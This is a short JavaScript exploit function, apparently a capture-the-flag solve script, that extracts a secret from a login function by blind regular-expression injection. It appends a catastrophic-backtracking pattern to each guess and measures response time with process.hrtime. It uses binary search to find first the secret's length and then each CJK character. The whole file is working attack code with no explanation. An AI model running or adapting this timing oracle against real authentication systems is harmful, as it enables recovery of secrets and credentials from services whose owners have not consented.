function crack(login) {
  const mks=s => `${s}|^(?:.?){11}.{5}`;
  const thres = 100000;
  const time=s => {
    let t = process.hrtime();
    login(s);
    return process.hrtime(t)[1];
  }
  let sl;
  
  while (true) {
    let [l, r]=[256, 512];
    while (r-l > 1) {
      let m=(l+r)/2|0, s=mks(`.{${l},${m}}$`);
      time(s) < thres ? r=m : l=m;
    }
    let f = time(mks(`.{${l}}$`))<thres?l:r;
    if (time(mks(`.{${f}}$`)) < thres) {
      sl = f;
      break;
    }
  }
  
  let rs='';
  for (let i = 0; i < sl; i++) {
    while(true) {
      let [l, r]=[0x4e00, 0x9fff];
      while(r-l > 1) {
        let m = (l+r)/2|0, s=mks(`.{${i}}[\\u${l.toString(16)}-\\u${m.toString(16)}]`);
        time(s)<thres?r=m:l=m;
      }
      let f = time(mks(`.{${i}}\\u${l.toString(16)}`))<thres?l:r;
      if (time(mks(`.{${i}}\\u${f.toString(16)}`)) < thres) {
        rs += String.fromCodePoint(f);
        break;
      }
    }
  }
  
  return rs;
}
